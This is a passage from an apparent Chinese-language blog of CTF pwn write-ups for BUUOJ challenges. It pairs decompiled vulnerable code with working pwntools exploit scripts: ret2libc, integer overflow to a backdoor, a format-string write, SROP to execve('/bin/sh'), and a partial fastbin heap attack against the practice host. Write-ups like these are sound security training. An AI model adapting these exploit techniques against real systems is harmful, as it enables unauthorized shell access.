<span class="token function">context</span><span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token char">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token char">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token char">'debug'</span><span class="token punctuation">)</span>

pal<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token char">'a'</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token char">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token char">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token char">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>pal<span class="token punctuation">)</span>
write_addr<span class="token operator">=</span><span class="token function">u32</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"write_addr===>"</span><span class="token punctuation">,</span><span class="token function">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span><span class="token function">LibcSearcher</span><span class="token punctuation">(</span><span class="token char">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>

libc_base<span class="token operator">=</span>write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span><span class="token function">dump</span><span class="token punctuation">(</span><span class="token char">'write'</span><span class="token punctuation">)</span>
system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span><span class="token function">dump</span><span class="token punctuation">(</span><span class="token char">'system'</span><span class="token punctuation">)</span>
binsh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span><span class="token function">dump</span><span class="token punctuation">(</span><span class="token char">'str_bin_sh'</span><span class="token punctuation">)</span>
pal<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token char">'a'</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token char">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>pal<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Partial RELRO
Stack<span class="token operator">:</span>    No canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>与上题一样</p>
<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> '<span class="token operator">/</span>mnt<span class="token operator">/</span>hgfs<span class="token operator">/</span>shared<span class="token operator">/</span>ctf<span class="token operator">-</span>learn<span class="token operator">/</span><span class="token number">2020</span>_babystack2'
    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
    RELRO<span class="token operator">:</span>    Partial RELRO
    Stack<span class="token operator">:</span>    No canary found
    NX<span class="token operator">:</span>       NX enabled
    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>
  <span class="token class-name">size_t</span> nbytes<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h] BYREF</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">LODWORD</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"**********************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*     Welcome to the BJDCTF!     *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"* And Welcome to the bin world!  *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*  Let's try to pwn the world!   *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"* Please told me u answer loudly!*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]Are u ready?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]Please input the length of your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nbytes <span class="token operator">></span> <span class="token number">10</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Oops,u name is too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]What's u name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>很明显的整数溢出，一个输入0可以几乎无限溢出</p>
<p>然后一个backdoor</p>
<p>就搞定了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import <span class="token operator">*</span>

r<span class="token operator">=</span><span class="token function">remote</span><span class="token punctuation">(</span><span class="token char">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28161</span><span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">r</span><span class="token expression"><span class="token operator">=</span><span class="token function">process</span><span class="token punctuation">(</span></span><span class="token char">'./bjdctf_2020_babystack2'</span><span class="token expression"><span class="token punctuation">)</span></span></span>
backdoor_addr<span class="token operator">=</span><span class="token number">0x400726</span>

r<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>'<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Please input the length of your name<span class="token operator">:</span>'<span class="token punctuation">)</span>
r<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span><span class="token char">'-1'</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span>b<span class="token char">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>b<span class="token char">'b'</span><span class="token operator">*</span><span class="token number">0x8</span>
payload<span class="token operator">+=</span><span class="token function">p64</span><span class="token punctuation">(</span>backdoor_addr<span class="token punctuation">)</span>
r<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>b<span class="token char">'[+]What\'s u name?'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Partial RELRO
Stack<span class="token operator">:</span>    Canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-5Ch] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+7Ch] [ebp-Ch]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">be_nice_to_people</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x50u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d!\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> x <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"running sh..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>就是一个任意地址读x&#x3D;4就行啦</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import<span class="token operator">*</span>
sh<span class="token operator">=</span><span class="token function">remote</span><span class="token punctuation">(</span><span class="token char">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26902</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token char">'debug'</span>

over_flow<span class="token operator">=</span><span class="token number">0x0804A02C</span>
pal<span class="token operator">=</span><span class="token function">p32</span><span class="token punctuation">(</span>over_flow<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token char">'%11$n'</span>
sh<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>pal<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    No RELRO
Stack<span class="token operator">:</span>    No canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本题就是一个溢出然后一个后门</p>
<p>因为retn之前没有leave所以没有ebp</p>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Partial RELRO
Stack<span class="token operator">:</span>    No canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>后门</p>
<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Partial RELRO
Stack<span class="token operator">:</span>    No canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>常规rop</p>
<h2 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
 RELRO<span class="token operator">:</span>    Partial RELRO
 Stack<span class="token operator">:</span>    No canary found
 NX<span class="token operator">:</span>       NX enabled
 PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">signed</span> __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>

  v0 <span class="token operator">=</span> <span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x400uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">sys_write</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先是系统调用read和write，搞得不能泄露libc基址，很显然栈溢出</p>
<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059136.png" alt="image-20240306231221635" style="zoom: 50%;" />

<p>没有leave，因此0x10后面就是ret</p>
<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059137.png" alt="image-20240306231332851"></p>
<p>两个gadget，一个rax&#x3D;15是sigreturn ，一个是rax&#x3D;59是execve</p>
<p>而vuln是系统调用就有syscall</p>
<p>那么很显然是SROP，万事俱备只差&#x2F;bin&#x2F;sh\x00的addr</p>
<p>那只能自己写</p>
<p>那就只能调用read_write看看能不能写到跟&#x2F;bin&#x2F;sh\x00偏移固定的地址啦</p>
<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059138.png" alt="image-20240307010520356" style="zoom:50%;" />

<p>这个东西一看就知道是地址，就gdb进去看，然后出来看，减一下</p>
<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059139.png" alt="image-20240307010810093" style="zoom:50%;" />

<p>突然发觉可以用search，记下来</p>
<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059140.png" alt="image-20240307010855890" style="zoom:50%;" />

<p>偏移是128：这是一个大坑，因为glibc版本不同，他的偏移也是不同的！！！！其实是0x118偏移，但是不改libc版本就是0x128偏移</p>
<p>因为buf是在rsp+10，而write能写0x30个字节，那么就会有rbp在里面</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token comment">#sh=process('./ciscn_s_3')</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27109</span><span class="token punctuation">)</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_s_3'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

main_addr<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
rax_15_ret<span class="token operator">=</span><span class="token number">0x04004DA</span>
syscall_ret<span class="token operator">=</span><span class="token number">0x0400517</span>
read_write_ret<span class="token operator">=</span><span class="token number">0x004004F1</span>

pal<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token string">b'a'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_write_ret<span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pal<span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
binsh_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x118</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"binsh_addr===>"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

frame<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
frame<span class="token punctuation">.</span>rax<span class="token operator">=</span>constants<span class="token punctuation">.</span>SYS_execve
frame<span class="token punctuation">.</span>rdi<span class="token operator">=</span>binsh_addr
frame<span class="token punctuation">.</span>rsi<span class="token operator">=</span><span class="token number">0</span>
frame<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0</span>
frame<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscall_ret
frame_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>

pal<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rax_15_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span><span class="token operator">+</span>frame_bytes
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pal<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>首先是它一开始就给你了一个gift：栈地址</p>
<p>然后估摸是crashme\x00绕过避免改payload,然后就是溢出</p>
<p>因为这里\n会截断，所以两个想法</p>
<p>一个是shellcode写栈上</p>
<p>一个是rop链</p>
<h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Full RELRO
Stack<span class="token operator">:</span>    Canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为内存页的缘故，所以一般刚初始化的堆块起始地址末尾为00</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	首先是分配多个堆块，包括一个size为0x20堆块，以及0x90堆块，然后free chunk1，再改chunk1的fd位指向chunk2，我们是要将chunk2再次malloc，但是fastbin堆块分配的时候会有check size的检查，那么就再覆盖0x90堆块的size为0x20，之后malloc了之后改回来，然后再释放该堆块到unsortedbin，就可以Print泄露libc基址</p>
<p>​	之后便是分配堆块到malloc_hook上方，可以通过字节错位找到相应的堆块</p>
<p>fastbin中有fd的先被分配</p>
<p>以下是一些过程</p>
<p>首先要分配fastbin，就要找到合法的堆块，可以用</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">find_fake_fast addr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>找到堆块</p>
<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059141.png" alt="image-20240308142904319"></p>
<p>填充完就这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059143.png" alt="image-20240308145448733"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token comment">#sh=process('./babyheap_0ctf_2017')</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28594</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Command: '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
